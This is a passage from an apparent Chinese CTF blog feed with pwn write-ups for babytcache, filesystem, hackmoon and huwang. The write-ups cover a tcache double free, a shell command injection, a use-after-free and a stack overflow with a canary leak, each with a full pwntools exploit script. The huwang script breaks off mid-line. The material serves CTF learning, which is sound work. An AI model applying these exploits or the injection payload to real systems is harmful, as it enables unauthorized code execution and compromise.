        &lt;h1 id=&quot;babyheap&quot;&gt;&lt;a href=&quot;#babyheap&quot; class=&quot;headerlink&quot; title=&quot;babyheap&quot;&gt;&lt;/a&gt;babyheap&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.9-tcache_exploit</title>
    <link href="http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/"/>
    <id>http://siriuswhiter.tk/2019/03/02/introduction-to-pwn2-9-tcache-exploit/</id>
    <published>2019-03-02T06:02:54.000Z</published>
    <updated>2019-03-02T07:25:12.250Z</updated>
    
    <content type="html"><![CDATA[<p><em>为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。</em></p><h1 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h1><p>glibc 在2.26之后加入了tcache机制，之前仅仅大略看了下原理，基本没什么保护，这次h4lo大佬给的是tcache的题目，顺便来练练手，因为保护比fastbin还少，所以利用起来也比较简单。</p><p>简单来说，tcache相当于插队插在了fastbin 及 smallbin 前面，内部chunk大小不排序，且最多7个，malloc时优先在里面找，free时优先进入tcache，大小都要小于0x408，当然还有一些其他的机制就不多说了</p><h1 id="babytcache"><a href="#babytcache" class="headerlink" title="babytcache"></a>babytcache</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>三个功能 add delete show</p><p>add 最多九个chunk，固定malloc(0x50)，指针存放在bss段<br>delete 检查idx范围，之后仅仅free<br>show puts指针内容</p><p>保护：开了NX 及 Canary，No pie,got表可写</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看上去就是个tcache的练手题目，也基本没有检查</p><p>2.27版本的 tcache 甚至没有double free检查，也就是说，现在可以在没有其他chunk的情况下free一个chunk多次进入tcache</p><p>所以我们的思路很清晰– double free进入bss段，改变指针泄露libc地址</p><p>得到libc地址之后复写got表，getshell. (复写free不成功，不太清楚为什么，复写puts没问题)</p><ul><li>需要注意的是，tcache中有一个计数的tc_idx，也就是如果采用double free，会造成尝试分配到heap以外的时候，已经是第三次从tcache中取出chunk，而我们之前仅仅往里面放入了两个chunk，这样计数的tc_idx就会变成-1，结果便是我们可能之后无法再次使用tcache，此时free会略过tcache，malloc查询tcache时便会报错。</li></ul><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./babytcache&apos;)</span><br><span class="line">elf = ELF(&apos;./babytcache&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc-2.27.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(con):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;content:&apos;,con)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&apos;,&apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;index:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x6020e0+8))</span><br><span class="line">add(&apos;aaa&apos;)</span><br><span class="line">add(p64(elf.got[&apos;free&apos;]))        //保证搞完后tcache没有被破坏</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">free_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print &apos;free_addr: &apos;+hex(free_addr)</span><br><span class="line">system_addr = free_addr - libc.symbols[&apos;free&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &apos;system_addr: &apos;+hex(system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">add(&apos;/bin/sh&apos;)</span><br><span class="line">add(p64(system_addr))          //这个时候tcache已经坏了，但是不影响我们</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;为了有个高版本的glibc，宿舍感人网速10k/s下了两天下了20％，还是选择在昨天下了一个ubuntu 18，好在这次环境安装异常稳妥，没有任何报错甚至有点不习惯。。。&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Tcache&quot;&gt;&lt;a href=&quot;#Tcache&quot; clas
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2019.2安恒月赛pwn</title>
    <link href="http://siriuswhiter.tk/2019/02/26/2019-2%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9Bpwn/"/>
    <id>http://siriuswhiter.tk/2019/02/26/2019-2安恒月赛pwn/</id>
    <published>2019-02-26T14:00:41.000Z</published>
    <updated>2019-02-27T08:14:00.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>重点函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall checksec(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-98h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x80uLL);</span><br><span class="line">  printf(&quot;Input the Index:&quot;, a2, &amp;s);</span><br><span class="line">  v3 = get_num();</span><br><span class="line">  if ( cnt &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    snprintf(&amp;s, 0x80uLL, &quot;echo \&quot;%s\&quot;| md5sum&quot;, (char *)&amp;ptr + 0x90 * v3 + 0x30);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No Such Index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>给了几个函数，看了下没什么用，其中包括一个后门函数，但是限制两个字节且不能是sh，尝试vi提示没有安装，没有办法<br>checksec这边会执行几个指令，想办法绕过就好了，像web题一样</p><p>echo “” ; /bin/sh ; “”| md5sum  </p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./filesystem&apos;)</span><br><span class="line">#sh = remote(&apos;101.71.29.5&apos;, 10017)</span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Create&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input Filename: &apos;)</span><br><span class="line">sh.sendline(&apos;aaaaa&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Edit&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input File Content: &apos;)</span><br><span class="line">sh.sendline(&apos;&quot;; /bin/sh ; &quot;&apos;)</span><br><span class="line"></span><br><span class="line">print sh.recvuntil(&apos;&gt; &apos;)</span><br><span class="line">sh.sendline(&apos;Checksec&apos;)</span><br><span class="line">print sh.recvuntil(&apos;Input the Index:&apos;)</span><br><span class="line">sh.sendline(&apos;0&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="hackmoon"><a href="#hackmoon" class="headerlink" title="hackmoon"></a>hackmoon</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>标准的选项题，有add print delete 功能</p><p>add 限制五次分配chunk，会先分配八个字节，分配用来存放一个print_moon_content函数指针及之后为用户分配的chunk指针，同时会在bss段存放为用户分配的chunk指针。<br>print 会检查输入的idx及bss段的指针，在指针存在的情况下，调用该指针处的函数，也就是之前存放的print_moon_content函数指针</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl print_moon_content(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  return puts(*(const char **)(a1 + 4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete 会将之前的两个指针依次free，但是其他的什么也没动，存在UAF问题</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>UAF漏洞很明显，同时指针被放到了堆中，很容易想到利用UAF控制指针即可，又同时，题中给了magic函数，所以想办法让magic函数指针覆盖某个chunk的指针就可以了</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./hackmoon&apos;)</span><br><span class="line">elf = ELF(&apos;./hackmoon&apos;)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;moon size :&apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&apos;Content :&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index, ):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Success\n&apos;)</span><br><span class="line">    return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">magic= 0x8048986</span><br><span class="line">add(0x8,&apos;aaaaaaa&apos;)</span><br><span class="line">add(0x8,&apos;bbbbbbb&apos;)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line">add(0x20,&apos;ccccccccc&apos;)</span><br><span class="line">add(0x8,&apos;deadbeef&apos;)</span><br><span class="line">delete(3)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x8,p32(magic)*2)</span><br><span class="line">show(3)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;filesystem&quot;&gt;&lt;a href=&quot;#filesystem&quot; class=&quot;headerlink&quot; title=&quot;filesystem&quot;&gt;&lt;/a&gt;filesystem&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>护网杯pwn复现</title>
    <link href="http://siriuswhiter.tk/2019/02/15/%E6%8A%A4%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/"/>
    <id>http://siriuswhiter.tk/2019/02/15/护网杯pwn复现/</id>
    <published>2019-02-15T04:42:46.000Z</published>
    <updated>2019-03-02T06:52:01.756Z</updated>
    
    <content type="html"><![CDATA[<h1 id="huwang"><a href="#huwang" class="headerlink" title="huwang"></a>huwang</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>表面是个堆题，但实际上是个栈溢出。。。</p><p>给了add delete 函数，但是没有漏洞，题目额外给了一个guess 函数，guess成功会进入secret函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn guess()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST04_4</span><br><span class="line">  __int64 v1; // [rsp+0h] [rbp-80h]</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-80h]</span><br><span class="line">  signed int i; // [rsp+0h] [rbp-80h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-7Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int rand; // [rsp+8h] [rbp-78h]</span><br><span class="line">  int max_cnt; // [rsp+Ch] [rbp-74h]</span><br><span class="line">  char v8; // [rsp+10h] [rbp-70h]</span><br><span class="line">  char s[32]; // [rsp+20h] [rbp-60h]</span><br><span class="line">  char s1; // [rsp+40h] [rbp-40h]</span><br><span class="line">  char name; // [rsp+60h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v12; // [rsp+78h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;please input your name&quot;);</span><br><span class="line">  read(0, &amp;name, 0x20uLL);</span><br><span class="line">  memset(s, 0, 0x10uLL);</span><br><span class="line">  puts(&quot;Do you want to guess the secret?&quot;);</span><br><span class="line">  get_str(&amp;v8, 2LL);</span><br><span class="line">  if ( v8 == &apos;y&apos; )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( access(&quot;/tmp/secret&quot;, 0) == -1 )</span><br><span class="line">    &#123;</span><br><span class="line">      HIDWORD(v1) = open(&quot;/tmp/secret&quot;, 65, 511LL);</span><br><span class="line">      fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">      read(fd, s, 0xCuLL);</span><br><span class="line">      LODWORD(v1) = 0;</span><br><span class="line">      while ( (signed int)v1 &lt;= 11 )</span><br><span class="line">      &#123;</span><br><span class="line">        s[(signed int)v1] &amp;= 1u;</span><br><span class="line">        LODWORD(v1) = v1 + 1;</span><br><span class="line">      &#125;</span><br><span class="line">      write(SHIDWORD(v1), s, 0xCuLL);</span><br><span class="line">      close(SHIDWORD(v1));</span><br><span class="line">      close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v0 = open(&quot;/tmp/secret&quot;, 0, v1);</span><br><span class="line">    read(v0, s, 0xCuLL);</span><br><span class="line">    close(v0);</span><br><span class="line">    puts(&quot;Input how many rounds do you want to encrypt the secret:&quot;);</span><br><span class="line">    max_cnt = input_0x10();</span><br><span class="line">    if ( max_cnt &gt; 10 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;What? Why do you need to encrypt so many times?&quot;);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;At least encrypt one time&quot;, s);</span><br><span class="line">      exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    HIDWORD(v2) = open(&quot;/tmp/secret&quot;, 513);</span><br><span class="line">    LODWORD(v2) = 0;</span><br><span class="line">    while ( (unsigned int)v2 &lt; max_cnt )</span><br><span class="line">    &#123;</span><br><span class="line">      MD5((__int64)s, 16LL, (__int64)s);</span><br><span class="line">      LODWORD(v2) = v2 + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(SHIDWORD(v2), s, 0x10uLL);</span><br><span class="line">    close(SHIDWORD(v2));</span><br><span class="line">    puts(&quot;Try to guess the md5 of the secret&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    read(0, &amp;s1, 0x10uLL);</span><br><span class="line">    if ( !memcmp(&amp;s1, s, 0x10uLL) )</span><br><span class="line">      secret((__int64)&amp;name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    v4 = open(&quot;/tmp/secret&quot;, 513, 511LL, v2);</span><br><span class="line">    rand = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">    read(rand, s, 0xCuLL);</span><br><span class="line">    for ( i = 0; i &lt;= 11; ++i )</span><br><span class="line">      s[i] &amp;= 1u;</span><br><span class="line">    write(v4, s, 0xCuLL);</span><br><span class="line">    close(v4);</span><br><span class="line">    close(rand);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printf(&quot;Oh!bye %s\n&quot;, &amp;name);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall secret(__int64 name)</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // ST1B_1</span><br><span class="line">  int v3; // [rsp+1Ch] [rbp-214h]</span><br><span class="line">  char occ; // [rsp+20h] [rbp-210h]</span><br><span class="line">  char s; // [rsp+120h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+228h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Congratulations, %s guessed my secret!\n&quot;, name);</span><br><span class="line">  puts(&quot;And I want to know someting about you, and introduce you to other people who guess the secret!&quot;);</span><br><span class="line">  puts(&quot;What`s your occupation?&quot;);</span><br><span class="line">  get_str(&amp;occ, 0xFFLL);</span><br><span class="line">  v3 = snprintf(</span><br><span class="line">         &amp;s,</span><br><span class="line">         0xFFuLL,</span><br><span class="line">         &quot;I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome.........&quot;</span><br><span class="line">         &quot;.................................................................................................&quot;,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occ);</span><br><span class="line">  puts(&quot;Here is your introduce&quot;);</span><br><span class="line">  puts(&amp;s);</span><br><span class="line">  puts(&quot;Do you want to edit you introduce by yourself[Y/N]&quot;);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v1 == &apos;Y&apos; )</span><br><span class="line">    read(0, &amp;s, v3 - 1);</span><br><span class="line">  return printf(&quot;The final presentation is as follows:%s\n&quot;, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下保护，除了PIE其他的都开了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>secret函数栈溢出，为了能够进入secret函数，需要绕过guess函数中的检查，这里便是神奇的地方了：</p><p>程序在读入随机数时会先将其清空，而之后输入加密次数时如果输入-1会使程序卡住之后超时退出，在一小段时间之内，本该被加密的文件实际上便是空的。</p><p>而此时如果再次重连程序，md5加密其实便是对0加密，这里大佬又神奇的输入HEX[00000000000000000000000000000000]的md5值并decode(‘hex’)，从而进入secret函数。</p><p>因为进入secret函数内会先输出前面输入的name，这里可以巧妙地顺便将canary输出，有了canary之后的便顺水推舟了。</p><p><em>ps： 但是感觉后面的栈布局有点奇怪，之后再看一看</em></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line"></span><br><span class="line">def six(name,rd,secret,flag=1):</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; \n&apos;)</span><br><span class="line">    sh.sendline(&apos;666&apos;)</span><br><span class="line">    sh.recvuntil(&apos;name\n&apos;)</span><br><span class="line">    sh.send(name)</span><br><span class="line">    sh.recvuntil(&apos;secret?\n&apos;)</span><br><span class="line">    sh.sendline(&apos;y&apos;)</span><br><span class="line">    sh.recvuntil(&apos;secret:\n&apos;)</span><br><span class="line">    sh.sendline(str(rd))</span><br><span class="line">    if flag == 1:</span><br><span class="line">        sh.recvuntil(&apos;secret\n&apos;)</span><br><span class="line">        sh.send(secret)</span><br><span class="line"></span><br><span class="line">six(&apos;aaa&apos;,-1,&apos;bbb&apos;,0)</span><br><span class="line">sh.recvuntil(&apos;timeout~&apos;)</span><br><span class="line">sh = process(&apos;./huwang&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">six(&apos;a&apos;*0x19,1,&apos;4ae71336e44bf9bf79d2752e234818a5&apos;.decode(&apos;hex&apos;))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;a&apos;*0x19)</span><br><span class="line">canary = u64(&apos;\x00&apos;+sh.recvn(7))</span><br><span class="line">print &apos;canary: &apos;+hex(canary)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;occupation?\n&apos;)</span><br><span class="line">sh.send(&apos;a&apos; * 0xff)</span><br><span class="line">sh.recvuntil(&apos;[Y/N]\n&apos;)</span><br><span class="line">sh.sendline(&apos;Y&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">shellcode = &apos;a&apos; * 0x108 + p64(canary) + p64(0)</span><br><span class="line">shellcode += p64(0x0000000000401573) + p64(0x0602F70) + p64(0x40101C)     </span><br><span class="line">sh.send(shellcode)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Congratulations, &apos;)</span><br><span class="line">libc_addr = u64(sh.recvn(6) + &apos;\x00&apos; * 2) - 